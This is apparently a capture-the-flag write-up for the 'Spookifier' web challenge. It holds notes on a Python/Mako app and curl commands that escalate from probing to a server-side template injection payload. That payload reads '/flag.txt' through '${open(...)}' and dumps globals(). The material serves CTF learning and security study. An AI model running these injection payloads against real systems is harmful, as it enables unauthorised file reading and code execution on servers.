# Web 2 - Spookifier


```html
<!-- index.html -->

<!-- form GET to / -->

<table class="table table-bordered">
  <tbody>
    ${output}
  </tbody>
</table>
```

```python
# utils.py change_font()

text_list = [*text_list]  # can we add arbitrary text here

add_font_to_list = lambda text,font_type: ([current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()) and None

add_font_to_list(text_list, 'font1')

# downstream writes to output in HTML template


# temp added this and another table entry; output to globals.txt
all_fonts.append(str(globals()))
```

```sh
curl --get --data-urlencode "text=hello world" http://$TARGET/

# lets make things easier; https://github.com/ericchiang/pup

curl --get --stderr - --data-urlencode "text=hello world" http://0.0.0.0:1337/ | pup 'div.container table tbody tr td text{}'

# temp added this to utils.py and another table entry; output to globals.txt
# all_fonts.append(str(globals()))

cat globals.txt | grep 'font'
# need to override a font with lambda returning system info? nope


# notice rendering is format strings
# use python format string attack - https://podalirius.net/en/articles/python-format-string-vulnerabilities/

curl --get --stderr - --data-urlencode "text=<p>{self.__init__.__globals__}</p>" http://0.0.0.0:1337/ | pup 'div.container table tbody tr td text{}'

# uses mako templates ${}
# https://docs.makotemplates.org/en/latest/syntax.html
curl --get --stderr - --data-urlencode 'text=${1+2}' http://0.0.0.0:1337/ | pup 'div.container table tbody tr td text{}'
# there we go; can also do text=globals()

curl --get --stderr - --data-urlencode 'text=${globals()}' http://0.0.0.0:1337/ | pup 'div.container table tbody tr td text{}'

curl --get --stderr - --data-urlencode 'text=${"globals()["__builtins__"].open("/flag.txt")"|n}' http://0.0.0.0:1337/ | pup 'div.container table tbody tr td text{}'

# lmao way simpler...look at globals()...there's an open() function already there

curl --get --stderr - --data-urlencode "text=\${open('/flag.txt').readlines()}" http://0.0.0.0:1337/ | pup 'div.container table tbody tr td text{}'

```



